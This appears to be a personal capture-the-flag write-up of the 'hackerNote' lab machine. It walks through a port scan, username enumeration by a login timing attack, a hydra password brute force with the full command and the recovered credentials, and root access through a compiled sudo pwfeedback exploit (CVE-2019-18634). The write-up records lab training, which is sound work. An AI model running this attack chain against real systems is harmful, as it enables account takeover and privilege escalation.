@@ -1,0 +1,128 @@
+rustscan -a 10.10.69.58
+
+
+Open 10.10.69.58:22
+Open 10.10.69.58:80
+Open 10.10.69.58:8080
+
+
+nmap scan 
+
+
+PORT     STATE SERVICE REASON  VERSION
+80/tcp   open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Home - hackerNote
+8080/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Home - hackerNote
+
+
+
+made a new account 
+sessiontoken : 9b1fa3078198a491ece2ff3e8c36ff74
+
+
+test2 : 1678fc5a2607475783a11b8cc72c3639
+
+after making some accounts and seeing the login process i though of seeing the network tab and see through the request and saw that this is making a req to /api/user/login for login 
+and taking much time in loggin in and not taking much time when i was entering bad creds
+
+
+
+Create your own user account
+
+Log in to your account
+
+Try and log in to an invalid user account
+
+Try and log in to your account, with an incorrect password.
+
+Notice the timing difference. This allows user enumeration
+
+
+okay! so from this we get to know that this is a time based attack
+
+
+
+
+Use the timing attack
+
+now as it is a timing attack we can make a python script and see which are the valid usernames
+
+making of python script (ps: as i dont know python i used the script given in walkthrough)
+
+======
+
+In python, we can use this code and the Requests library to send this request as follows:
+
+creds = {"username":username,"password":"invalidPassword!"}
+response = r.post(URL,json=creds)
+
+The next stage is timing this. Using the "time" standard library, we can work out the time difference between when we send the request and when we get a response. I've moved the login request into it's own function called doLogin.
+
+startTime = time.time()
+doLogin(user)
+endTime = time.time()
+
+The next step is now to repeat this for all usernames in the username list. This can be done with a series of for loops. The first will read usernames from a file into a list, and the second will test each of these usernames and see the time taken to respond. For my exploit, I decided that times within 10% of the largest time were likely to be valid usernames.
+
+Why does the time taken change?
+
+The backend is intentionally poorly written. The server will only try to verify the password of the user if it receives a correct username. The psuedocode to explain this better is below.
+
+def login(username, password):
+    if username in users: ##If it's a valid username
+        login_status = check_password(password) ##This takes a noticeable amount of time
+        if login_status:
+            return new_session_token()
+        else:
+            return "Username or password incorrect"
+    else:
+        return "Username or password incorrect"
+
+Pre-written exploits in Golang and Python are available here: https://github.com/NinjaJc01/hackerNoteExploits
+
+Use the Honeypot capture or Names/names.txt from https://github.com/danielmiessler/SecLists/tree/master/Usernames. The shorter the list is, the faster the exploit will complete. (Hint: one of those wordlists is shorter.)
+
+NOTE: The Golang exploit is not reliable but it is faster. If you get invalid usernames, try re-running it after a minute or switching to the python exploit.
+
+======================
+
+after downloading the script we have to make basic changes in the script like changing the url inside the script and changing the username wordlist to the name given inside the scritp
+
+after that when we will start the attack we will the username james as valid
+
+james
+
+after this we have to do bruteforce attack on the machine to get the password of the user james as the hint is given we can make a wordlist from the combinator.bin from hashcat utils
+
+which can be found here /usr/lib/hashcat-utils/combinator.bin
+
+after this do this
+
+/usr/lib/hashcat-utils/combinator.bin colors.txt numbers.txt
+
+after this you will get a wordlist of 180 words now just do the hydra attack
+
+
+
+hydra -l james -P lokji 10.10.69.58 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"   -I -t63
+[80][http-post-form] host: 10.10.69.58   login: james   password: blue7
+
+when we will login we will get the password for james ssh
+
+dak4ddb37b
+
+after loggin into the james machine i did sudo -l and entered the password for james!
+
+and it was having * symbol when i was entering the password and i was already knewing this exploit was  CVE-2019-18634 
+
+after this i downloaded the exploit and wget into the machine compiled it
+
+gcc -o exploit pwfeedback.c
+
+changed the perms of the file and ran it i got the root! cheers!
